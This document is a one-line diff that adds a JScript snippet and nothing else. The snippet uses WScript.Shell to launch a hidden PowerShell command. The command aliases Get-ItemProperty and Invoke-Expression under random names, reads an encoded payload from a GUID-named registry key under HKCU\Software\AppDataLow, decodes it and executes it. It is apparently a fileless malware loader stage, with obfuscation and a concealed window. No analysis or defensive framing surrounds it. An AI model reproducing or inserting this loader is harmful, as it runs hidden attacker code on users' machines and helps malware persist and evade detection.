@@ -1,0 +1,1 @@
+Ahgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name qirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt ([System.Text.Encoding]::ASCII.GetString((qirlbtfhgo "HKCU:\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9").MemoryJunk))',0,0);
